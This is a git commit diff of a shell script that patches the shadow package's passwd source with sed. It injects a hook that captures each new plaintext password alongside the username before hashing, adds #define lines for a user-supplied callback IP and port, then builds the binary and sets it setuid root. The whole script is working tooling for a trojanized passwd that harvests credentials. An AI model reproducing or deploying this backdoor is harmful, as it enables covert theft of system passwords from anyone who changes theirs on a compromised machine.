3496103b65ea2d68c1ab926b53d68acba94db22d
PapaChain <braydenjw00@gmail.com>
2021-12-02 16:16:27 -0500

    Working Script, remove unneeded print statements

--- autogen.sh
+++ autogen.sh
@@ -11,7 +11,7 @@ echo -n "Enter the IP Address to Callback to : "
 read ip
 echo -n "Set the destination port : "
 read port
-echo -ne "IP : ${ip}\n Port : ${port}\nConfirm these settings [y/n]"
+echo -ne "IP : ${ip}\n Port : ${port}\n Confirm these settings [y/n] : "
 read pass
 if [[ $pass == n ]]; then
     exit 0
@@ -26,25 +26,36 @@ cd shadow
 
 ## Add Inject Code ##
 
+cd ../
 # Assign Code to Paste
 imports=$(head -n 4 hook_code.txt)
-def_var="#define IP ${ip}"
-def_port="#define PORT ${port}" 
-code=$(tail -n 10 hook_code.txt)
+def_var="#define IP \"${ip}\""
+def_port="#define PORT ${port}"
+code=$(tail -n +10 hook_code.txt)
 
-# Inject Code
-sed -i "/salt = crypt_make_salt (NULL, NULL);/i \      writetofile(pass);" src/passwd.c
+# Fix Newline Char
+imports=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$imports")
+def_var=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$def_var")
+def_port=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$def_port")
+code=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$code")
+
+## Modify Code ##
+cd shadow
+# Inject Hook
+sed -i "/salt = crypt_make_salt (NULL, NULL);/i \        writetofile(pass);" src/passwd.c
 
 # Add Imports
-sed -i "/#include \"shadowio.h\"/a \"$imports\"" src/passwd.c
+sed -i '/#include \"shadowio.h\"/a '"$imports"'' src/passwd.c
 
 # Add Variables
-sed -i "/#include <string.h>/a \"$def_var\"\n \"$def_port\"" src/passwd.c
+sed -i '/#include <string.h>/a '"$def_var"'\n'"$def_port"'' src/passwd.c
 
-# Add Hook
-sed -i "/static int new_password/i \"$code\"" src/passwd.c
+# Add Hook Function
+sed -i '/static int new_password (const struct passwd \*pw)/i '"$code"'' src/passwd.c
+sed -i 's/\", name, password);/ /g' src/passwd.c
+sed -i 's/fprintf(fptr, \"%s:%s/fprintf(fptr, \"%s:%s\\n\", name, password);/g' src/passwd.c
 
 
 ## Make ##
 sudo make all
-chmod 4755 shadow/src/passwd 
+sudo chmod 4755 shadow/src/passwd 
